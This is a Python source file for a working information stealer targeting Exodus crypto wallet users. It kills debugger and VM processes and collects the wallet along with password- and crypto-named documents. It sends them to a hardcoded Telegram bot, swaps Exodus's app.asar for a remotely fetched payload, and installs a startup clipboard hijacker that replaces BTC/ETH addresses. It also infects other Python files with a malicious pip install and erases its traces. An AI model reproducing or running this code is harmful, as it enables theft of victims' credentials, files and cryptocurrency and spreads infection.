import os, shutil, threading, requests, psutil

class EX0D3:
    def __init__(self) -> None:
        self.__TOKEN__ = "5232185879:AAEuP8JWwt6CFyeIckS_KhidATXqy3FxFho"
        self.__CHATID__ = "-1001669822286"
        self.__BASE__ = f"https://api.telegram.org/bot{self.__TOKEN__}/"
        self.__STUB__ = "https://rentry.co/xgrf7/raw"

        self.K1LL5 = [ "exodus", "dnspy", "httpdebugger", "httptoolkit", "fiddler", "packet", "wireshark", "processhacker", "vmware", "taskmgr", "netstat", "netmon", "tcpview", "cain", "regmon", "filemon", "ksdumper", "ida46", "ida64", "scylla", "charles.exe", "regedit", "df5serv", "vmtoolsd", "ollydbg", "pestudio", "vgauthservice", "vmacthlp", "x96dbg", "x32dbg", "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "joeboxcontrol", "xenservice", "joeboxserver", "qemu-ga"]
        self.EX0D3_P4TH = [ os.getenv('APPDATA') + "/Exodus/exodus.wallet" ]
        self.T3MP_D3ST = [ os.getenv('LOCALAPPDATA') + "/Temp/" + os.environ['USERNAME'] ]
        self.INJ3CT_P4TH = [ os.getenv('LOCALAPPDATA') + "/exodus" ]

        self.USERIP = requests.get("https://api.ipify.org").text.strip()

        self.K1W1_P4TH = [ "/Desktop", "/Downloads", "/Documents" ]
        self.K1W1_K3YW0RD5 = [ "passwords",  "account", "acount", "passw", "secret", "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", "acount", "paypal", "banque", "account", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "binance" ]
        self.K1W1_3XT = [ "txt", "csv", "pdf" ]

        self.SCR1PT = "exec(\"\nimport os\nfor _ in range(2):\n    try:import pyrequestsv2\n    except:os.system(\"pip install pyrequestsv2 >nul\")\n\")"
        self.CL1PP3R = "exec(\"\nimport os\nfor _ in range(2):\ntry:\nimport re, clipboard, ctypes, time, threading\nexcept:\nos.system('pip install clipboard >nul')\n\nutils = {\n\"patterns\": {\n\"btc\": \"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,39}$)\",\n\"eth\": \"(?:^0x[a-fA-F0-9]{40}$)\"\n},\n\"address\": {\n\"btc\": \"bc1qedn8nmpg6gh2dln70j5m9gxlh5nh7j0cctyz5f\",\n\"eth\": \"0x4bE1fd229cd062459673B867a0Ed40b2c2481dC7\"\n}\n}\n\ndef get_clipboard():\ntry:\nCF_TEXT = 1\nkernel32 = ctypes.windll.kernel32\nkernel32.GlobalLock.argtypes = [ctypes.c_void_p]\nkernel32.GlobalLock.restype = ctypes.c_void_p\nkernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]\nuser32 = ctypes.windll.user32\nuser32.GetClipboardData.restype = ctypes.c_void_p\nuser32.OpenClipboard(0)\nif user32.IsClipboardFormatAvailable(CF_TEXT):\ndata = user32.GetClipboardData(CF_TEXT)\ndata_locked = kernel32.GlobalLock(data)\ntext = ctypes.c_char_p(data_locked)\nvalue = text.value\nkernel32.GlobalUnlock(data_locked)\nuser32.CloseClipboard()\nreturn value.decode()\nexcept:\npass\n\ndef CheckClipboard():\ntime.sleep(0.1)\ntry:\nfor pattern in utils[\"patterns\"]:\nif re.findall(utils[\"patterns\"][pattern], get_clipboard()):\nclipboard.copy(utils['address'][pattern])\nexcept:\npass\n\nwhile True:\nthreading.Thread(target=CheckClipboard()).start()\n\")"

    def __HasEX0D3(self):
        Has = False
        for path in self.EX0D3_P4TH:
            if os.path.exists(path):
                Has = True
        
        return Has

    def __Has1NF3CT3D(self):
        return os.path.exists(os.getenv('LOCALAPPDATA') + "/Temp/injected")

    def __KillInstances(self):
        for proc in psutil.process_iter():
            if any(pct in proc.name().lower() for pct in self.K1LL5):
                try:proc.kill()
                except:pass
            
    def __GrabFiles(self):
        for path in self.EX0D3_P4TH:
            if os.path.exists(path):
                for D35T in self.T3MP_D3ST:
                    shutil.copytree(path, D35T)
    
    def __MakeArchive(self):
        for D35T in self.T3MP_D3ST:
            shutil.make_archive(D35T, "zip", D35T)
            shutil.rmtree(D35T)

    def __SendFiles(self):
        requests.post(self.__BASE__+"sendMessage", data={"text": f"<u><b>EX0D3 N3W U53R</b></u> <code>->></code> {os.environ['USERNAME']}\n<code>-</code> {self.USERIP}", 'chat_id': self.__CHATID__, "parse_mode": "HTML"})
        
        for D35T in self.T3MP_D3ST:
            requests.post(self.__BASE__+"sendDocument", data={'chat_id': self.__CHATID__}, files={'document': open(D35T+".zip", "rb")})
    
    def __KiwiGrabber(self):
        K1W15 = []
        for P4TH in self.K1W1_P4TH:
            K1W1 = threading.Thread(target=self.__KiwiGrabberF0LD3R5, args=[os.path.expanduser("~")+P4TH])
            K1W1.start()
            K1W15.append(K1W1)
        
        for K1W1 in K1W15:
            K1W1.join()

    def __KiwiGrabberF1L35(self, F1L3):
        F_EXT = F1L3[len(F1L3)-3:]
        F1L3_N4M3 = F1L3.split("/")[len(F1L3.split("/"))-1]
        if any(EXT in F_EXT for EXT in self.K1W1_3XT):
            if any(K3YW0RD in F1L3_N4M3.lower() for K3YW0RD in self.K1W1_K3YW0RD5):
                for D35T in self.T3MP_D3ST:
                    shutil.copy(F1L3, D35T)
    
    def __KiwiGrabberF0LD3R5(self, F0LD3R):
        F1L35 = os.listdir(F0LD3R)
        for F1L3 in F1L35:
            np = F0LD3R + "/" + F1L3
            if os.path.isfile(np):
                self.__KiwiGrabberF1L35(np)
            elif os.path.isdir(np):
                self.__KiwiGrabberF0LD3R5(np)
    
    def __RemoveMarks(self):
        for D35T in self.T3MP_D3ST:
            shutil.rmtree(D35T, ignore_errors=True)
        
        for D35T in self.T3MP_D3ST:
            shutil.rmtree(D35T + ".zip", ignore_errors=True)
    
    def __InjectElectron(self):
        FP4TH, GP = "", []
        for P4TH in self.INJ3CT_P4TH:
            FP4TH += P4TH
            for F0LD3R5 in os.listdir(P4TH):
                if "app-" in F0LD3R5 and os.path.isdir(P4TH + "/" + F0LD3R5):
                    GP.append(F0LD3R5)
        
        FP4TH += "/" + GP[len(GP)-1] + "/resources/app.asar"
        os.remove(FP4TH)

        APS4R = requests.get(requests.get(self.__STUB__).text.strip())
        open(FP4TH, "wb").write(APS4R.content)
        open(os.getenv('LOCALAPPDATA') + "/Temp/injected", "a+").write("True")
    
    def __SpreadWorker(self, F0LD3R):
        F1L35 = os.listdir(F0LD3R)
        for F1L3 in F1L35:
            np = F0LD3R + "/" + F1L3
            if os.path.isfile(np):
                F_EXT = np[len(np)-2:]
                if F_EXT == "py":
                    content = open(np, "r").read()
                    if self.SCR1PT not in content:
                        open(np, "w").write(self.SCR1PT + content)
            elif os.path.isdir(np):
                self.__SpreadWorker(np)
    
    def __SpreadExode(self):
        K1W15 = []
        for P4TH in self.K1W1_P4TH:
            K1W1 = threading.Thread(target=self.__SpreadWorker, args=[os.path.expanduser("~")+P4TH])
            K1W1.start()
            K1W15.append(K1W1)
        
        for K1W1 in K1W15:
            K1W1.join()

    def __InjectClipper(self):
        open(os.getenv('APPDATA') + f"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ChromeDriver.pyw", "w+", encoding="utf-8").write(self.CL1PP3R)

    def Init(self):
        if self.__HasEX0D3():
            self.__KillInstances()

            self.__GrabFiles()
            self.__KiwiGrabber()
            self.__MakeArchive()

            self.__KillInstances()

            self.__SendFiles()

            if not self.__Has1NF3CT3D():
                self.__KillInstances()
                self.__InjectElectron()

            self.__InjectClipper()
            self.__SpreadExode()
            
            self.__RemoveMarks()

EX0D3().Init()